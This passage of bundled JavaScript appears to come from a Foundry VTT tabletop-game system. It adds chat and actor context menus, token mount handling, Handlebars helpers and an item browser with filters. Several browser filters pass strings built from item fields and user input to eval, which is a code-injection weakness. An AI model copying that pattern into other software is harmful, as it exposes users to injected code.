        name: game.i18n.localize("ACTOR.AddBasicSkills"),
        condition: game.user.isGM,
        icon: '<i class="fas fa-plus"></i>',
        callback: target => {
          const actor = game.actors.get(target.attr('data-document-id'));
          actor.addBasicSkills();
        }
      });
    options.push(
      {

        name: game.i18n.localize("ACTOR.ClearMount"),
        icon: '<i class="fas fa-horse"></i>',
        callback: target => {
          const actor = game.actors.get(target.attr('data-document-id'));
          return actor.update({
            "system.status.mount": {
              "id": "",
              "mounted": false,
              "isToken": false,
              "tokenData": {
                "scene": "",
                "token": ""
              }
            }
          })
        }
      });
    options.push(
      {

        name: game.i18n.localize("ACTOR.ImportStatBlock"),
        condition: game.user.isGM,
        icon: '<i class="fa fa-download"></i>',
        callback: target => {
          const actor = game.actors.get(target.attr('data-document-id'));
          new StatBlockParser(actor).render(true);
        }
      });
  });

  /**
 * Add right click option to damage chat cards to allow application of damage
 * Add right click option to use fortune point on own rolls
 */
  Hooks.on("getChatLogEntryContext", (html, options) => {
    let canApply = li => game.messages.get(li.attr("data-message-id")).getOpposedTest() || li.find(".dice-roll").length > 0;
    let canApplyFortuneReroll = function (li) {
      //Condition to have the fortune contextual options:
      //Be owner of the actor
      //actor have fortune point
      //Own the roll
      //Once per roll (or at least, not on a reroll card)
      //Test must be failed 
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return test && test.actor.isOwner && test.actor.status.fortune?.value > 0 && test.failed && !test.fortuneUsed.reroll

    };
    let canApplyFortuneAddSL = function (li) {
      //Condition to have the fortune contextual options:
      //Be owner of the actor
      //Have fortune point
      //Own the roll
      //Once per roll (or at least, not on a reroll card)
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return test && test.actor.isOwner && test.actor.status.fortune?.value > 0 && !test.fortuneUsed.SL 
    };
    let canApplyDarkDeals = function (li) {
      //Condition to have the darkdeak contextual options:
      //Be owner of character
      //Own the roll
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return test && test.actor.isOwner && test.actor.type == "character"
    };

    let canGMReroll = function (li) {
      //Condition to have the darkdeak contextual options:
      //Be owner of character
      //Own the roll
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return test && game.user.isGM
    };

    let canTarget = function (li) {
      //Condition to be able to target someone with the card
      //Be owner of character
      //Own the roll
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return test && test.actor.isOwner
    };

    let canCompleteUnopposed = function (li) {
      //Condition to be able to target someone with the card
      //Be owner of character
      //Own the roll
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return game.user.isGM && test && test.opposedMessages.length >= 2
    };

    let canApplyAllDamage = function (li) {
      //Condition to be able to target someone with the card
      //Be owner of character
      //Own the roll
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return game.user.isGM &&  test && test.opposedMessages.length >= 2 && test.opposedMessages.some(m => m?.getOppose()?.resultMessage)
    };

    let canApplyTotalPower = function (li) {
      //Condition to be able to target someone with the card
      //Be owner of character
      //Own the roll
      let message = game.messages.get(li.attr("data-message-id"));
      let test = message.getTest();
      return (message.isOwner || message.isAuthor) && test && test instanceof CastTest && test.result.critical && game.settings.get("wfrp4e", "useWoMOvercast") && !test.result.totalPower
    };

    options.push(
      {
        name: game.i18n.localize("CHATOPT.ApplyDamage"),
        icon: '<i class="fas fa-user-minus"></i>',
        condition: canApply,
        callback: li => {

          if (li.find(".dice-roll").length) {
            let amount = li.find('.dice-total').text();
            canvas.tokens.controlled.map(i => i.document.actor).concat(Array.from(game.user.targets).map(i => i.document.actor)).forEach(a => a.applyBasicDamage(amount));
          }
          else {
            let message = game.messages.get(li.attr("data-message-id"));
            let opposedTest = message.getOpposedTest();

            if (!opposedTest.defenderTest.actor.isOwner)
              return ui.notifications.error(game.i18n.localize("ErrorDamagePermission"))

            opposedTest.defenderTest.actor.applyDamage(opposedTest, game.wfrp4e.config.DAMAGE_TYPE.NORMAL)
              .then(updateMsg => OpposedWFRP.updateOpposedMessage(updateMsg, message.id));
          }
        }
      },
      {
        name: game.i18n.localize("CHATOPT.ApplyDamageNoAP"),
        icon: '<i class="fas fa-user-shield"></i>',
        condition: canApply,
        callback: li => {
          if (li.find(".dice-roll").length) {
            let amount = li.find('.dice-total').text();
            canvas.tokens.controlled.map(i => i.document.actor).concat(Array.from(game.user.targets).map(i => i.document.actor)).forEach(a => a.applyBasicDamage(amount, { damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP }));
          }
          else {
            let message = game.messages.get(li.attr("data-message-id"));
            let opposedTest = message.getOpposedTest();

            if (!opposedTest.defenderTest.actor.isOwner)
              return ui.notifications.error(game.i18n.localize("ErrorDamagePermission"))

            opposedTest.defenderTest.actor.applyDamage(opposedTest, game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP)
              .then(updateMsg => OpposedWFRP.updateOpposedMessage(updateMsg, message.id));
          }
        }
      },
      {
        name: game.i18n.localize("CHATOPT.ApplyDamageNoTB"),
        icon: '<i class="fas fa-fist-raised"></i>',
        condition: canApply,
        callback: li => {
          if (li.find(".dice-roll").length) {
            let amount = li.find('.dice-total').text();
            canvas.tokens.controlled.map(i => i.document.actor).concat(Array.from(game.user.targets).map(i => i.document.actor)).forEach(a => a.applyBasicDamage(amount, { damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_TB }));
          }
          else {
            let message = game.messages.get(li.attr("data-message-id"));
            let opposedTest = message.getOpposedTest();

            if (!opposedTest.defenderTest.actor.isOwner)
              return ui.notifications.error(game.i18n.localize("ErrorDamagePermission"))

            opposedTest.defenderTest.actor.applyDamage(opposedTest, game.wfrp4e.config.DAMAGE_TYPE.IGNORE_TB)
              .then(updateMsg => OpposedWFRP.updateOpposedMessage(updateMsg, message.id));
          }
        }
      },
      {
        name: game.i18n.localize("CHATOPT.ApplyDamageNoTBAP"),
        icon: '<i class="fas fa-skull-crossbones"></i>',
        condition: canApply,
        callback: li => {
          if (li.find(".dice-roll").length) {
            let amount = li.find('.dice-total').text();
            canvas.tokens.controlled.map(i => i.document.actor).concat(Array.from(game.user.targets).map(i => i.document.actor)).forEach(a => a.applyBasicDamage(amount, { damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL }));
          }
          else {
            let message = game.messages.get(li.attr("data-message-id"));
            let opposedTest = message.getOpposedTest();

            if (!opposedTest.defenderTest.actor.isOwner)
              return ui.notifications.error(game.i18n.localize("ErrorDamagePermission"))

            opposedTest.defenderTest.actor.applyDamage(opposedTest, game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL)
              .then(updateMsg => OpposedWFRP.updateOpposedMessage(updateMsg, message.id));
          }
        }
      },
      {
        name: game.i18n.localize("CHATOPT.UseFortuneReroll"),
        icon: '<i class="fas fa-dice"></i>',
        condition: canApplyFortuneReroll,
        callback: li => {
          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          test.actor.useFortuneOnRoll(message, "reroll");
        }
      },
      {
        name: game.i18n.localize("CHATOPT.Reroll"),
        icon: '<i class="fas fa-dice"></i>',
        condition: canGMReroll,
        callback: li => {
          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          test.reroll();
        }
      },
      {
        name: game.i18n.localize("CHATOPT.UseFortuneSL"),
        icon: '<i class="fas fa-plus-square"></i>',
        condition: canApplyFortuneAddSL,
        callback: li => {
          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          test.actor.useFortuneOnRoll(message, "addSL");
        }
      },
      {
        name: game.i18n.localize("CHATOPT.DarkDeal"),
        icon: '<i class="fas fa-pen-nib"></i>',
        condition: canApplyDarkDeals,
        callback: li => {
          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          test.actor.useDarkDeal(message);
        }
      },
      {
        name: game.i18n.localize("CHATOPT.OpposeTarget"),
        icon: '<i class="fas fa-crosshairs"></i>',
        condition: canTarget,
        callback: li => {
          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          let targets = Array.from(game.user.targets).map(t => t.actor.speakerData(t.document));
          if (canvas.scene) { 
            game.user.updateTokenTargets([]);
            game.user.broadcastActivity({targets: []});
          }

          test.context.targets = test.context.targets.concat(targets);
          targets.map(t => WFRP_Utility.getToken(t)).forEach(t => {
            test.createOpposedMessage(t);
          });
        }
      },
      {
        name: game.i18n.localize("CHATOPT.CompleteUnopposed"),
        icon: '<i class="fas fa-angle-double-down"></i>',
        condition: canCompleteUnopposed,
        callback: li => {

          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          test.opposedMessages.forEach(message => {
            if (message)
            {
              let oppose = message.getOppose();
              oppose.resolveUnopposed();
            }
          });
        }
      },
      {
        name: game.i18n.localize("CHATOPT.ApplyAllDamage"),
        icon: '<i class="fas fa-user-minus"></i>',
        condition: canApplyAllDamage,
        callback: li => {
          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          for (let message of test.opposedMessages) {
            if (message) {
              let opposedTest = message.getOppose();
              if (!opposedTest.defenderTest.actor.isOwner) {
                ui.notifications.error(game.i18n.localize("ErrorDamagePermission"));
              } else {
                opposedTest.defender.applyDamage(opposedTest.resultMessage.getOpposedTest(), game.wfrp4e.config.DAMAGE_TYPE.NORMAL)
                  .then(updateMsg => OpposedWFRP.updateOpposedMessage(updateMsg, opposedTest.resultMessage.id));
              }
            }
          }
        }
      },
      {
        name: game.i18n.localize("CHATOPT.TotalPower"),
        icon: '<i class="fa-solid fa-bolt"></i>',
        condition: canApplyTotalPower,
        callback: li => {
          let message = game.messages.get(li.attr("data-message-id"));
          let test = message.getTest();
          test.preData.totalPower = true;
          test.roll();
        }
      }
    );
  });
}

function token() {
  // Adds tooltips to conditions in the condition menu
  Hooks.on("renderTokenHUD", async (obj, html) => {
    for (let condition of html.find("img.effect-control")) {
      condition.title = game.wfrp4e.config.conditions[condition.dataset["statusId"]];
      if (condition.dataset["statusId"] == "dead")
        condition.title = "Dead";
    }
  });

  Hooks.on("preUpdateToken", (token, data) => 
  {
      // AreaHelpers.checkTokenUpdate(token, data, canvas.templates.placeables);
  });



  Hooks.on("createToken", async (token, data, user) => {

    if(game.user.isUniqueGM) // Prevents multiple mount tokens
    {
      let scene = token.parent;

      if (token.actor.isMounted && canvas.scene.id == scene.id)
      {
        let mount = token.actor.mount;
        let mountToken = await mount.getTokenDocument();
        mountToken.updateSource({ x : token.x, y : token.y, hidden: token.hidden });

        // Shift token slightly if same size
        if (mountToken.actor.details.size.value == token.actor.details.size.value)
        {
          mountToken.updateSource({
            x : mountToken.x + canvas.grid.size/4,
            y : mountToken.y + canvas.grid.size/4
          });
        }
        mountToken = (await scene.createEmbeddedDocuments("Token", [mountToken]))[0];
        await token.update({"flags.wfrp4e.mount" : mountToken.id }); // place mount id in token so when it moves, the mount moves (see updateToken)
        token.zIndex = 1; // Ensure rider is on top

        if (!mountToken.actorLink)
        {
            let tokenData = {
              scene : scene._id,
              token : mountToken._id
            };
          token.actor.update({"system.status.mount.isToken" : true, "system.status.mount.tokenData" : tokenData});
        }
      }

      token.object.renderAuras();
      AreaHelpers.checkAreas(scene);
    }

    if (game.user.id == user)
    {
        token.actor.runScripts("createToken", token);
    }
  });

  Hooks.on("updateToken", (token, updateData, options) => {
      let scene = token.parent;
      if (game.user.isUniqueGM)
      {
        if (foundry.utils.hasProperty(token, "flags.wfrp4e.mount") && (updateData.x || updateData.y) && scene.id == canvas.scene.id)
        {
          if (canvas.tokens.get(token.id).actor.isMounted)
          {
            let mountId = token.getFlag("wfrp4e", "mount");
            let tokenUpdate = {_id : mountId, x : token.x, y: token.y };
            if (token.actor.details.size.value == token.actor.mount.details.size.value)
            {
              tokenUpdate.x += canvas.grid.size / 4;
              tokenUpdate.y += canvas.grid.size / 4;
            }
            scene.updateEmbeddedDocuments("Token", [tokenUpdate]);

          }
        }
        if (updateData.x || updateData.y)
        {
          AreaHelpers.checkAreas(scene);
        }
      }
      // Empty resolve for when there's no token animation
      (token.object._animation || Promise.resolve()).then(() => {
        token.object.renderAuras();
      });
    });


    // If deleted token has an aura, need to check areas
    Hooks.on("deleteToken", async (token, data, user) => {
      AreaHelpers.checkAreas(token.parent);
    });

  Hooks.on('renderTokenHUD', (hud, html) => {
    _addMountButton(hud, html);
    _addPassengerButton(hud, html);
  });

  Hooks.on("refreshToken", token => {
    if (token.document?.getFlag("wfrp4e", "hidePassengers"))
      token.passengers?.destroy();
    else
      passengerRender(token);
    });
    



  
  function _addMountButton(hud, html)
  {
    if (canvas.tokens.controlled.length == 2)// && canvas.tokens.controlled[0].actor.details.size.value != canvas.tokens.controlled[1].actor.details.size.value)
    {
      const button = $(
        `<div class='control-icon'><i class="fas fa-horse"></i></div>`
      );
      button.attr(
        'title',
        'Mount'
      );

      button.mousedown(event => {
        let token1 = canvas.tokens.controlled[0].document;
        let token2 = canvas.tokens.controlled[1].document;

        if (!token1 || !token2)
          return  

        let mountee = hud.object.document;
        let mounter = hud.object.document.id == token1.id ? token2 : token1;
        if (game.wfrp4e.config.actorSizeNums[mounter.actor.details.size.value] > game.wfrp4e.config.actorSizeNums[mountee.actor.details.size.value])
        {
          let temp = mountee;
          mountee = mounter;
          mounter = temp;
        }

        let tokenData = undefined;
        if (!mountee.actorLink) {
          tokenData = {
            scene: canvas.scene.id,
            token: mountee.id
          };
          if (mounter.actorLink)
            ui.notifications.warn(game.i18n.localize("WarnUnlinkedMount"));
        }
        mounter.actor.update({ "system.status.mount.id": mountee.actorId, "system.status.mount.mounted": true, "system.status.mount.isToken": !mountee.actorLink, "system.status.mount.tokenData": tokenData });
        canvas.scene.updateEmbeddedDocuments("Token", [{ "flags.wfrp4e.mount": mountee.id, _id: mounter.id }, { _id: mounter.id, x: mountee.x, y: mountee.y }]);
        mounter.zIndex = 1; // Ensure rider is on top


      });
      html.find('.col.right').append(button);
    }
  }

  function _addPassengerButton(hud, html)
  {
      if (hud.object.actor?.type != "vehicle")
      {
        return
      }

      const button = $(
        `<div class='control-icon ${hud.object.document.getFlag("wfrp4e", "hidePassengers") ? "active" : ""}'><i class="fa-solid fa-user-slash"></i></div>`
      );
      button.attr(
        'title',
        game.i18n.localize("WFRP4E.TogglePassengers")
      );

      button.mousedown(event => {
        let newState = !hud.object.document.getFlag("wfrp4e", "hidePassengers");
        event.currentTarget.classList.toggle("active", newState);
        
        hud.object.document.setFlag("wfrp4e", "hidePassengers", newState).then(() => {
          // newState ? hud.object.passengers?.destroy() : passengerRender(hud.object);
        });
      });
      html.find('.col.right').append(button);

  }
}

function handlebars () {

    Hooks.on("init", () => {
        Handlebars.registerHelper("ifIsGM", function (options) {
            return game.user.isGM ? options.fn(this) : options.inverse(this)
        });

        Handlebars.registerHelper("isGM", function (options) {
            return game.user.isGM
        });

        Handlebars.registerHelper("config", function (key) {
            return game.wfrp4e.config[key]
        });

        Handlebars.registerHelper("configLookup", function (obj, key) {
            if (obj && key)
                return game.wfrp4e.config[obj]?.[key]
            
        });

        Handlebars.registerHelper("array", function (array, cls) {
            if (typeof cls == "string")
                return array.map((value, index) => `<a data-index=${index} class="${cls}">${value}</a>`).join(`<h1 class="${cls} comma">, </h1>`)
            else
                return array.join(", ")
        });

        Handlebars.registerHelper("hasProperty", function (obj, key) 
        {
            return foundry.utils.hasProperty(obj, key);
        });    

        Handlebars.registerHelper("tokenImg", function(actor) {
            let tokens = actor.getActiveTokens();
            let tokenDocument = actor.prototypeToken;
            if(tokens.length == 1) {
                tokenDocument = tokens[0].document;
            }
            return tokenDocument.hidden ? "systems/wfrp4e/tokens/unknown.png" : tokenDocument.texture.src;
        });

        Handlebars.registerHelper("tokenName", function(actor) {
            let tokens = actor.getActiveTokens();
            let tokenDocument = actor.prototypeToken;
            if(tokens.length == 1) {
                tokenDocument = tokens[0].document;
            }
            return tokenDocument.hidden ? "???" : tokenDocument.name;
        });

        Handlebars.registerHelper("settings", function (key) {
            return game.settings.get("wfrp4e", key);
        });
});
}

function templates() 
{
    Hooks.on("updateMeasuredTemplate", (template, data, options, user) => 
    {
        if (game.user.id == user && (data.x || data.y))
        {
            AreaHelpers.checkAreas(template.parent);
        }
    });

    Hooks.on("createMeasuredTemplate", (template, options, user) => 
    {
        if (game.user.id == user)
        {
            AreaHelpers.checkAreas(template.parent);
        }
        if (template.getFlag("wfrp4e", "instantaneous"))
        {
            // Perhaps a kludge of a solution, but it will be fine for now
            game.wfrp4e.utility.sleep(1000).then(() => {
                game.wfrp4e.utility.log("Removing instantaneous effect after template placement");
                template.setFlag("wfrp4e", "effectUuid", null);
            });
        }
    });


    Hooks.on("deleteMeasuredTemplate", (template, options, user) => 
    {
        if (game.user.id == user)
        {
            AreaHelpers.checkAreas(template.parent, [template]);
        }
    });


}

function registerHooks() {
    init();
    ready();
    canvas$1();
    chat();
    combat();
    controlButtons();
    hotbarDrop();
    journal();
    sidebar();
    rolltable();
    entryContext();
    token();
    handlebars();
    i18n();
    settings();
    keepId();
    templates();
    notes();



}

/** Class for the WFRP4e Item Browser that collects all items in the world and compendia and
 *  offers functionality to filter through them to search easily. By default, you can filter
 *  through the name and description, as well as item type. If an item type is selected, more
 *  filters are shown that only apply to those types (mostly). If you select Weapon - you can
 *  then select which weapon group, reach, etc. 
*/
class BrowserWfrp4e extends Application {
  constructor(app) {
    super(app);

    // Initializes filters to false
    this.filters = {
      type: {
        "ammunition": { display: "Ammunition", value: false },
        "armour": { display: "Armour", value: false },
        "career": { display: "Career", value: false },
        "container": { display: "Container", value: false },
        "critical": { display: "Critical", value: false },
        "disease": { display: "Disease", value: false },
        "injury": { display: "Injury", value: false },
        "money": { display: "Money", value: false },
        "mutation": { display: "Mutation", value: false },
        "prayer": { display: "Prayer", value: false },
        "psychology": { display: "Psychology", value: false },
        "talent": { display: "Talent", value: false },
        "trapping": { display: "Trapping", value: false },
        "skill": { display: "Skill", value: false },
        "spell": { display: "Spell", value: false },
        "trait": { display: "Trait", value: false },
        "weapon": { display: "Weapon", value: false }
      },
      attribute: {
        name: "",
        description: "",
        worldItems: true,
      },
      // Various type specific filters that are shown based on type selected. 
      dynamic: {
        careergroup: { value: "", exactMatch: true, type: ["career"], show: false },
        class: { value: "", type: ["career"], show: false },
        level: { value: "", type: ["career"], show: false },
        statusTier: { value: "", type: ["career"], show: false },
        statusStanding: { value: "", relation: "", type: ["career"], show: false },
        characteristics: { value: [], type: ["career"], show: false },
        ammunitionType: { value: "", exactMatch: true, type: ["ammunition"], show: false },
        skills: { value: [], type: ["career"], show: false },
        talents: { value: [], type: ["career"], show: false },
        encumbrance: { value: "", relation: "", type: ["ammunition", "armour", "weapon", "container", "trapping"], show: false },
        availability: { value: "", type: ["ammunition", "armour", "weapon", "container", "trapping"], show: false },
        modifiesDamage: { value: false, type: ["ammunition"], show: false },
        modifiesRange: { value: false, type: ["ammunition"], show: false },
        qualitiesFlaws: { value: [], type: ["ammunition", "armour", "weapon"], show: false },
        armorType: { value: "", type: ["armour"], show: false },
        protects: { value: { head: true, body: true, arms: true, legs: true }, type: ["armour"], show: false },
        carries: { value: "", relation: "", type: ["container"], show: false },
        location: { value: "", type: ["critical", "injury"], show: false },
        wounds: { value: "", relation: "", type: ["critical"], show: false },
        symptoms: { value: [], type: ["disease"], show: false },
        mutationType: { value: "", type: ["mutation"], show: false },
        god: { value: "", type: ["prayer"], show: false },
        prayerType: { value: "", type: ["prayer"], show: false },
        range: { value: "", type: ["prayer", "spell"], show: false },
        duration: { value: "", type: ["prayer", "spell"], show: false },
        target: { value: "", type: ["prayer", "spell"], show: false },
        cn: { value: "", relation: "", type: ["spell"], show: false },
        magicMissile: { value: false, type: ["spell"], show: false },
        aoe: { value: false, type: ["spell"], show: false },
        lore: { value: "", type: ["spell"], show: false },
        extendable: { value: "", type: ["spell"], show: false },
        max: { value: "", type: ["talent"], show: false },
        tests: { value: "", type: ["talent"], show: false },
        trappingType: { value: "", type: ["trapping"], show: false },
        characteristic: { value: "", type: ["skill"], show: false },
        grouped: { value: "", type: ["skill"], show: false },
        advanced: { value: "", type: ["skill"], show: false },
        rollable: { value: false, type: ["trait"], show: false },
        weaponGroup: { value: "", type: ["weapon"], show: false },
        reach: { value: "", type: ["weapon"], show: false },
        weaponRange: { value: "", relation: "", type: ["weapon"], show: false },
        melee: { value: false, type: ["weapon"], show: false },
        ranged: { value: false, type: ["weapon"], show: false },
        twohanded: { value: false, type: ["weapon"], show: false },
        ammunitionGroup: { value: "", type: ["weapon"], show: false },
      }
    };

    // Different values used to filter. As items are read, different aspects are accumulated, such as lores, which are then selectable to filter by.
    this.careerGroups = [];
    this.careerClasses = [];
    this.gods = [];
    this.careerTiers = [1, 2, 3, 4];
    this.statusTiers = ["Gold", "Silver", "Brass"];
    this.lores = foundry.utils.deepClone(game.wfrp4e.config.magicLores);
    this.lores["arcane"] = game.i18n.localize("NAME.Arcane");

  }

  static get defaultOptions() {
    const options = super.defaultOptions;
    options.id = "wfrp4e-browser";
    options.template = "systems/wfrp4e/templates/browser/browser.hbs";
    options.classes.push("wfrp4e", "wfrp-browser");
    options.resizable = true;
    options.height = 900;
    options.width = 600;
    options.minimizable = true;
    options.title = "WFRP Browser";
    return options;
  }

  _getHeaderButtons() {
    let buttons = super._getHeaderButtons();
    // Add "Post to chat" button
    if (game.user.isGM) {
      buttons.push(
        {
          class: "import",
          icon: "fas fa-import",
          onclick: async ev => this.importResults()
        });
    }
    return buttons
  }

  // Save scroll positions and apply current filter when rendering
  async _render(force = false, options = {}) {
    await this.loadItems();
    this._saveScrollPos(); // Save scroll positions
    await super._render(force, options);
    this._setScrollPos(); // Save scroll positions
    this.applyFilter(this._element);
  }


  // Pass filter data to template
  getData() {
    let data = super.getData();
    data.filters = this.filters;
    data.relations = ["<", "<=", "==", ">=", ">"];
    data.availability =  game.wfrp4e.config.availability;
    data.ammunitionGroups =  game.wfrp4e.config.ammunitionGroups;
    data.locations = ["WFRP4E.Locations.head", "WFRP4E.Locations.body", "WFRP4E.Locations.arm", "WFRP4E.Locations.leg"].map(game.i18n.localize.bind(game.i18n));
    data.mutationTypes =  game.wfrp4e.config.mutationTypes;
    data.armorTypes =  game.wfrp4e.config.armorTypes;
    data.gods = this.gods;
    data.weaponGroups =  game.wfrp4e.config.weaponGroups;
    data.weaponReaches =  game.wfrp4e.config.weaponReaches;
    data.talentMax =  game.wfrp4e.config.talentMax;
    data.trappingTypes =  game.wfrp4e.config.trappingTypes;
    data.lores = this.lores;
    data.characteristics =  game.wfrp4e.config.characteristicsAbbrev;
    data.skillTypes =  game.wfrp4e.config.skillTypes;
    data.skillGroup =  game.wfrp4e.config.skillGroup;
    data.prayerTypes =  game.wfrp4e.config.prayerTypes;
    data.careerGroups = this.careerGroups;
    data.careerClasses = this.careerClasses;
    data.careerTiers = this.careerTiers;
    data.statusTiers = this.statusTiers;
    data.items = this.items;

    return data;
  }


  /**
   * Goes through each compendium and if it is an Item compendium,
   * loads the items with addItems(). Then it will add all the world
   * items.
   */
  async loadItems() {
    this.items = [];
    this.filterId = 0;

    let packCount = game.packs.size;
    let packCounter = 0;

    game.wfrp4e.DocumentCache = game.wfrp4e.DocumentCache || {};
  
    async function cacheDocuments(pack, documents) {
      game.wfrp4e.DocumentCache[pack.collection] = documents;
    }
    
  
    async function getCachedDocuments(pack) {
      if (game.wfrp4e.DocumentCache.hasOwnProperty(pack.collection)) {
        return game.wfrp4e.DocumentCache[pack.collection];
      }
    
      const documents = await pack.getDocuments();
      cacheDocuments(pack, documents);
      return documents;
    }

    for (let p of game.packs) {
      packCounter++;
      SceneNavigation.displayProgressBar({label: game.i18n.localize("BROWSER.LoadingBrowser"), pct: Math.round((packCounter / packCount) * 100) });

      if (p.metadata.type == "Item" && (game.user.isGM || !p.private)) {
        const content = await getCachedDocuments(p);
        this.addItems(content);
      }
    }
    this.addItems(game.items.contents.filter(i => i.permission > 1));
    this.items = this.items.sort((a, b) => (a.name.toLowerCase() > b.name.toLowerCase()) ? 1 : -1);
    this.careerGroups.sort((a, b) => (a > b) ? 1 : -1);
    this.careerClasses.sort((a, b) => (a > b) ? 1 : -1);
  }

  /**
   * addItems is used when loading items upon startup, it looks at each item
   * and determines if some values need to be recorded. For instance, we want 
   * to know all the career groups of all the careers being loaded, or all the 
   * lores of spells. This data is then made available to the user to filter by.
   * 
   * @param {Array} itemList List of items to be added
   */
  addItems(itemList) {
    for (let item of itemList) {
      if (item.type == "career") {
        if (!this.careerGroups.includes(item.system.careergroup.value))
          this.careerGroups.push(item.system.careergroup.value);
        if (!this.careerClasses.includes(item.system.class.value))
          this.careerClasses.push(item.system.class.value);
      }
      if (item.type == "prayer") {
        let godList = item.system.god.value.split(", ").map(i => {
          return i.trim();
        });
        godList.forEach(god => {
          if (!this.gods.includes(god))
            this.gods.push(god);
        });
      }

      item.filterId = this.filterId;
      this.filterId++;
    }
    this.items = this.items.concat(itemList);
  }

  /**
   * applyFilter is called each time the filter changes to correctly hide or show
   * different items based on the filter. The most complicated part is the dynamic filters
   * which is a giant case statement for each filter type. Each dynamic filter applied
   * will filter out the items that don't meant the criteria, but does not filter 
   * out items where the filter does not apply. i.e. changing damage does not affect
   * careers if you have both weapons and careers showing.
   * 
   * @param {Object} html html of the item list
   */
  applyFilter(html) {
    let items = this.items;
    let noItemFilter = true;
    let filteredItems = [];
    for (let filter in this.filters.type) {
      if (this.filters.type[filter].value) {
        filteredItems = filteredItems.concat(items.filter(i => i.type == filter));
        noItemFilter = false;
      }
    }

    if (noItemFilter)
      filteredItems = items;

    for (let filter in this.filters.attribute) {
      if (this.filters.attribute[filter] || filter == "worldItems") {
        switch (filter) {
          case "name":
            filteredItems = filteredItems.filter(i => i.name.toLowerCase().includes(this.filters.attribute.name.toLowerCase()));
            break;
          case "description":
            filteredItems = filteredItems.filter(i => i.system.description.value && i.system.description.value.toLowerCase().includes(this.filters.attribute.description.toLowerCase()));
            break;
          case "worldItems":
            filteredItems = filteredItems.filter(i => this.filters.attribute[filter] || !!i.compendium);
            break;
        }
      }
    }

    this.checkDynamicFilters(html);

    for (let filter in this.filters.dynamic) {
      if (this.filters.dynamic[filter].show && this.filters.dynamic[filter].value) {
        switch (filter) {
          case "statusTier":
            filteredItems = filteredItems.filter(i => !i.system.status || (i.system.status && i.system.status.tier.toLowerCase() == this.filters.dynamic[filter].value[0].toLowerCase()));
            break;
          case "statusStanding":
            filteredItems = filteredItems.filter(i => !i.system.status || (i.system.status && this.filters.dynamic[filter].relation && (0, eval)(`${i.system.status.standing}${this.filters.dynamic[filter].relation}${this.filters.dynamic[filter].value}`)));
            break;
          case "qualitiesFlaws":
            if (this.filters.dynamic[filter].value.length && this.filters.dynamic[filter].value.some(x => x))
              filteredItems = filteredItems.filter(i => {
                if (!i.system.qualities.value.length && !i.system.flaws.value.length)
                  return false;
                let properties = (Object.values(i.properties.qualities).concat(Object.values(i.properties.flaws))).map(i => i.display);
                if (!properties.length || (properties.length == 1 && properties[0] == "Special"))
                  return;

                return this.filters.dynamic[filter].value.every(value => { return properties.find(v => v.toLowerCase().includes(value.toLowerCase())) })

              });
            break;
          case "symptoms": {
            if (this.filters.dynamic[filter].value.length && this.filters.dynamic[filter].value.some(x => x))
              filteredItems = filteredItems.filter(i => {
                if (!i.system.symptoms)
                  return true;
                let s = i.system[filter].value.split(",").map(i => {
                  return i.trim().toLowerCase();
                });
                return this.filters.dynamic[filter].value.every(f => s.find(symptom => symptom.includes(f.toLowerCase())))
              });
          }
            break;

          case "characteristics":
          case "skills":
          case "talents":
            if (this.filters.dynamic[filter].value.length && this.filters.dynamic[filter].value.some(x => x))
              filteredItems = filteredItems.filter(i => !i.system[filter] || (i.system[filter] && this.filters.dynamic[filter].value.every(value => { return i.system[filter].find(v => v.toLowerCase().includes(value.toLowerCase())) })));
            break;

          case "twohanded":
          case "rollable":
          case "magicMissile":
          case "wearable":
            filteredItems = filteredItems.filter(i => !i.system[filter] || (i.system[filter] && this.filters.dynamic[filter].value == (!!i.system[filter].value)));
            break;
          case "aoe":
            filteredItems = filteredItems.filter(i => i.type != "spell" || (i.system.target && this.filters.dynamic[filter].value == i.system.target.aoe));
            break;
          case "extendable":
            filteredItems = filteredItems.filter(i => i.type != "spell" || (i.system.duration && this.filters.dynamic[filter].value == i.system.duration.extendable));
            break;

          case "melee":
          case "ranged":
            filteredItems = filteredItems.filter(i => i.type != "weapon" || filter ==  game.wfrp4e.config.groupToType[i.system.weaponGroup.value]);
            break;
          case "weaponRange":
            filteredItems = filteredItems.filter(i => !i.system.range || (i.system.range.value && !isNaN(i.system.range.value) && this.filters.dynamic[filter].relation && (0, eval)(`${i.system.range.value}${this.filters.dynamic[filter].relation}${this.filters.dynamic[filter].value}`)));
            break;
          case "cn":
          case "carries":
          case "encumbrance":
            filteredItems = filteredItems.filter(i => !i.system[filter] || (i.system[filter] && this.filters.dynamic[filter].relation && (0, eval)(`${i.system[filter].value}${this.filters.dynamic[filter].relation}${this.filters.dynamic[filter].value}`)));
            break;
          case "modifiesDamage":
            filteredItems = filteredItems.filter(i => !i.system.damage || (i.system.damage && this.filters.dynamic[filter].value == (!!i.system.damage.value)));
            break;
          case "modifiesRange":
            filteredItems = filteredItems.filter(i => !i.system.range || (i.system.range && this.filters.dynamic[filter].value == (!!i.system.range.value)) && i.system.range.value.toLowerCase() != "as weapon"); // kinda gross but whatev
            break;
          case "protects":
            filteredItems = filteredItems.filter(i => {
              if (!i.system.AP)
                return true;
              let show;
              if (this.filters.dynamic.protects.value.head && i.system.AP.head)
                show = true;
              if (this.filters.dynamic.protects.value.body && i.system.AP.body)
                show = true;
              if (this.filters.dynamic.protects.value.arms && (i.system.AP.lArm || i.system.AP.rArm))
                show = true;
